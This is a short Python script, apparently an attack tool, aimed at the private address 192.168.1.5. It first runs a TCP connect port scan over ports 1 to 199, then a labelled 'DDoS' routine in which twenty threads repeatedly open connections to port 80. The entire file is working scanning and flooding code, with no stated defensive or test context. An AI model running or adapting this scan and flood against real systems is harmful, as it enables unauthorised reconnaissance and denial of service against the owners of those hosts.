import socket
import threading

TARGET = "192.168.1.5"


def port_scan() -> None:
    print("[*] Running Port Scan...")
    for port in range(1, 200):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.01)
            s.connect((TARGET, port))
            s.close()
        except (ConnectionRefusedError, OSError, TimeoutError):
            pass


def ddos() -> None:
    print("[*] Running DDoS...")

    def flood() -> None:
        for _ in range(200):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((TARGET, 80))
                s.close()
            except (ConnectionRefusedError, OSError):
                pass

    threads = [threading.Thread(target=flood) for _ in range(20)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()


if __name__ == "__main__":
    port_scan()
    ddos()
